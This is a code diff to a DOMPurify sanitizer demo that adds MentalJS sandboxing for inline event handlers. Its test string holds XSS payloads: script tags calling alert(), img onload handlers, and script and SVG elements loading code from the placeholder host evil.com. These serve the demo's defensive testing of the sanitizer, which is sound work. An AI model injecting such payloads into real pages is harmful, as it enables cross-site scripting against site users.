@@ -15,13 +15,18 @@
             /* global DOMPurify */
             'use strict';
             
+            // Initialize MentalJS
+            MentalJS().init({dom: true});
+            
             // Specify dirty HTML
-            var dirty = 'hello<script>alert(1)<\/script>\
-                <img src="xyz" onload="alert(2)">goodbye\
+            var dirty = 'abc<script>alert(1)<\/script>\
+                <img src="xyz" onload="alert(2)">\
                 <img src="xyz" onload="alert`3`">\
+                <img src="xyz" onload="">\
                 <script src=//evil.com><\/script>\
-                <script src=//evil.com>alert(4)<\/script>\
-                <svg><script xlink:href=//evil.com>alert(4)<\/script></svg>\
+                <script>alert`4`<\/script>\
+                <script src=//evil.com>alert(5)<\/script>\
+                <svg><script xlink:href=//evil.com>alert(6)<\/script></svg>\
                 <svg><script href="//evil.com">123<\/script><p>';
             
             // allow script elements
@@ -54,13 +59,12 @@
             DOMPurify.addHook('uponSanitizeAttribute', function(node, data){
                 if(data.attrName.match(/^on\w+/)) {
                     var script = data.attrValue;
-                    if(!script){node.removeAttribute(data.attrName)}
                     try {
                         return data.attr.value = MentalJS().parse(
                             {options:{eval:false, dom:true}, code:script}
                         );
                     } catch(e) {
-                        node.removeAttribute(data.attrName);
+                        return data.attr.value = '';
                     }
                 }
             });            
